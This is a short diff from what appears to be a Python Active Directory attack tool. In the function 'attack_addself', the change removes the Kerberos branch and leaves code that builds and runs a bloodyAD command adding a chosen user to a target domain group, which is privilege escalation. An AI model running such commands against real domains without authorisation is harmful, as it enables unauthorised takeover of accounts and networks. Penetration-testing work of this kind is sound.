@@ -42,15 +42,7 @@ def attack_addself(session, target_group=None, target_user=None):
             f"bloodyAD --host {session.target_ip} -d {session.domain} "
             f"{auth} add groupMember \"{target_group}\" \"{target_user}\""
         )
-    else:
-        if not session.dc_hostname:
-            print(red("[-] Kerberos mode requires session.dc_hostname (FQDN of domain controller)."))
-            return
-        bloody_cmd = (
-            f"bloodyAD --kerberos --host {session.dc_hostname} --dc-ip {session.dc_ip} "
-            f"-d {session.domain} add groupMember \"{target_group}\" \"{target_user}\""
-        )
-
+        
     # === Run BloodyAD ===
     out, err = run_command(bloody_cmd)
     combined = out + "\n" + err
